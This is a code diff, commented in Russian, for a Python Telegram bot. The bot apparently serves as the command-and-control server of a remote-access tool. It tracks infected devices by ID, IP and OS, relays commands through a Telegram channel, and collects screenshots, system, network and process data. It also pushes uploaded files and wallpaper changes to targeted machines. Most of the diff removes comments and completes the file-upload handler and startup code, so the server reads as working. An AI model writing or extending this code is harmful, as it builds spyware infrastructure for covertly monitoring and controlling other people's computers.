@@ -410,7 +410,7 @@ async def send_command(callback: types.CallbackQuery):
         return
     
     cmd_type = parts[1]
-    device_id = "_".join(parts[2:])  # Для случаев когда в ID есть "_"
+    device_id = "_".join(parts[2:])
     
     # Маппинг команд
     cmd_map = {
@@ -648,10 +648,8 @@ async def handle_channel_messages(message: types.Message):
                 return
             base64_img = parts[1]
             
-            # Сохраняем изображение
             img_bytes = base64.b64decode(base64_img)
             
-            # Отправляем обратно как фото для подтверждения
             await bot.send_photo(
                 chat_id=ADMIN_ID,
                 photo=BufferedInputFile(img_bytes, filename="wallpaper.jpg"),
@@ -668,7 +666,6 @@ async def handle_channel_messages(message: types.Message):
         try:
             text_data = text.replace("LOG_REPLY:", "")
             
-            # Определяем устройство
             device_id = None
             pc_name = None
             for dev_id, name, last_seen, ip, os_info, first_seen in get_all_devices():
@@ -679,7 +676,6 @@ async def handle_channel_messages(message: types.Message):
             
             markup = get_device_menu(device_id) if device_id else None
             
-            # Обработка разных типов сообщений
             if "скриншот" in text_data.lower() or "screenshot" in text_data.lower():
                 if "base64:" in text_data:
                     try:
@@ -697,7 +693,6 @@ async def handle_channel_messages(message: types.Message):
                     except:
                         pass
             
-            # Информационные сообщения
             if any(key in text_data for key in ["Информация о системе", "Сетевая информация", "Батарея", "Процессы"]):
                 await bot.send_message(chat_id=ADMIN_ID, text=text_data, parse_mode="Markdown", reply_markup=markup)
             else:
@@ -722,10 +717,8 @@ async def handle_photo(message: types.Message):
     if message.from_user.id != ADMIN_ID:
         return
     
-    # Проверяем подпись для установки обоев
     if message.caption and "wallpaper" in message.caption.lower():
         try:
-            # Парсим ID устройства из подписи
             device_id_match = re.search(r'id[:\s]+([a-zA-Z0-9_-]+)', message.caption)
             if not device_id_match:
                 await message.reply("❌ Укажите ID устройства в подписи: `wallpaper id:DEVICE_ID`")
@@ -736,7 +729,6 @@ async def handle_photo(message: types.Message):
             file = await bot.get_file(photo.file_id)
             file_data = await bot.download_file(file.file_path)
             
-            # Кодируем в base64
             img_base64 = base64.b64encode(file_data.getvalue()).decode('utf-8')
             
             await bot.send_message(
@@ -748,7 +740,6 @@ async def handle_photo(message: types.Message):
             await message.reply(f"❌ Ошибка: {str(e)}")
         return
     
-    # Обычное фото сохраняем для возможной отправки
     await message.reply("📸 Фото получено. Используйте подпись `wallpaper id:DEVICE_ID` для установки обоев.")
 
 @dp.message(F.document)
@@ -758,7 +749,6 @@ async def handle_document(message: types.Message):
     
     if message.caption and "upload" in message.caption.lower():
         try:
-            # Парсим ID устройства из подписи
             device_id_match = re.search(r'id[:\s]+([a-zA-Z0-9_-]+)', message.caption)
             if not device_id_match:
                 await message.reply("❌ Укажите ID устройства в подписи: `upload id:DEVICE_ID`")
@@ -768,12 +758,24 @@ async def handle_document(message: types.Message):
             file = message.document
             file_data = await bot.download_file(file.file_path)
             
-            # Кодируем в base64
             file_base64 = base64.b64encode(file_data.getvalue()).decode('utf-8')
             
-            # Отправляем клиенту
             await bot.send_message(
                 chat_id=f"@{CHANNEL_USERNAME}",
                 text=f"UPLOAD_FILE:{device_id}:{file.file_name}:{file_base64}"
             )
-            await message.reply(f"📤 Файл `{file.file_name}` отправлен на устройство `{device_id
+            await message.reply(f"📤 Файл `{file.file_name}` отправлен на устройство `{device_id}`")
+        except Exception as e:
+            await message.reply(f"❌ Ошибка: {str(e)}")
+        return
+
+# --- ЗАПУСК ---
+
+async def main():
+    init_db()
+    print("[СЕРВЕР] База данных подключена. Ожидание сигналов...")
+    print(f"[СЕРВЕР] Бот запущен, ID админа: {ADMIN_ID}")
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
